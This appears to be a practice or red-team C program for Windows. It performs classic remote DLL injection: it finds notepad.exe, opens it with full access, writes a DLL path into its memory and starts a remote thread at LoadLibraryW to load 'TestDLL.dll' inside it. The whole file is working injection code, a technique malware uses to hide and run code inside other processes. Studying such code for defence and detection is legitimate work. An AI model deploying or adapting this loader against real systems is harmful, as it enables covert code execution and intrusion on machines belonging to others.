#include <windows.h>
#include <TlHelp32.h>
#include <string.h>
#include <stdio.h>


int getRemoteProcessHandle(OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {
	// TODO: desired injection process as parameter instead of hardcoded notepad


	// Get process listing snapshot
	HANDLE hSnapShot = NULL;
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == NULL) {
		printf("[!] Error getting process list snapshot \n");
		return -1;
	}

	// Must initialize dwSize according to docs
	PROCESSENTRY32 ProcList = {
		.dwSize = sizeof(PROCESSENTRY32)
	};
	if (!Process32First(hSnapShot, &ProcList)) {
		printf("[!] Error getting process details \n");
		return -1;
	}

	// Look for first instance of notepad.exe
	WCHAR szProcessName[] = L"notepad.exe";
	do {
		if (_wcsicmp(ProcList.szExeFile, szProcessName) == 0) {
			*dwProcessId = ProcList.th32ProcessID;
			printf("[i] Got Process Name %ls and PID %d \n", ProcList.szExeFile, *dwProcessId);
			break;
		}
	} while (Process32Next(hSnapShot, &ProcList));

	// Get handle
	*hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, *dwProcessId);
	if (*hProcess == NULL) {
		printf("[!] Error getting process handle from PID %u \n", *dwProcessId);
		return -1;
	}

	return 0;

}

int injectRemoteProcess(IN HANDLE* hProcess) {

	PVOID		pLoadLibraryW = NULL;
	PVOID		pAddress = NULL;
	DWORD		dwSizeToWrite = lstrlenW(L"TestDLL.dll") * sizeof(WCHAR);
	SIZE_T		lpNumberOfBytesWritten = NULL;
	HANDLE		hThread = NULL;

	pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	if (pLoadLibraryW == NULL) {
		printf("[!] Failed to get LoadLibraryW address");
		return -1;
	}

	pAddress = VirtualAllocEx(*hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[!] Failed allocating memory");
		return -1;
	}

	if (!WriteProcessMemory(*hProcess, pAddress, L"TestDLL.dll", dwSizeToWrite, &lpNumberOfBytesWritten)) {
		printf("[!] Failed writing process memory");
		return -1;
	}

	hThread = CreateRemoteThread(*hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
	if (hThread == NULL) {
		printf("[!] Failed starting thread");
		return -1;
	}

	WaitForSingleObjectEx(hThread, 2000, FALSE);
	return 0;

}

int main() {

	// Get handle to remote process (notepad)
	DWORD		ProcessId = NULL;
	HANDLE		hProcess = NULL;

	if (getRemoteProcessHandle(&ProcessId, &hProcess)) {
		printf("[!] Can't continue! No remote process handle \n");
		return -1;
	}

	if (injectRemoteProcess(&hProcess)) {
		printf("[!] Failed injecting");
		return -1;
	}

	return 0;

}